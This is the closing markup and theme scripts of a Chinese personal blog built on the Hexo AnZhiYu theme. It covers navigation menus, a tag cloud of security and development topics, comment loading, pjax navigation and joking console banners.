style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 0.88rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 0.88rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 0.88rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 0.88rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 0.88rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 0.88rem;">docker<sup>4</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 0.88rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 0.88rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 0.88rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 0.88rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 0.88rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 0.88rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 0.88rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 0.88rem;">ssrf<sup>1</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 0.88rem;">容器<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 0.88rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.88rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.0.8/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("02/18/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2023 By 安知鱼 V1.6.9",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hihopkc 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.56.5/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://hihopkc.space/',
+      region: '',
+      onCommentLoaded: () => {
+        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(runFn,0)
+    else getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://hihopkc.space/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const runFn = () => {
+    init();
+    
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getComment = () => {
+    const runTwikoo = () => {
+      twikoo.getRecentComments({
+        envId: 'https://hihopkc.space/',
+        region: '',
+        pageSize: 6,
+        includeReply: true
+      }).then(function (res) {
+        const twikooArray = res.map(e => {
+          return {
+            'content': changeContent(e.comment),
+            'avatar': e.avatar,
+            'nick': e.nick,
+            'url': e.url + '#' + e.id,
+            'date': new Date(e.created).toISOString()
+          }
+        })
+
+        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
+        generateHtml(twikooArray)
+      }).catch(function (err) {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+      })
+    }
+
+    if (typeof twikoo === 'object') {
+      runTwikoo()
+    } else {
+      getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runTwikoo)
+    }
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
+        }
+        
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('twikoo-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "visitor@anheyu.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script type="text/javascript" src="/js/fps.js"></script><div id="fps"></div><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
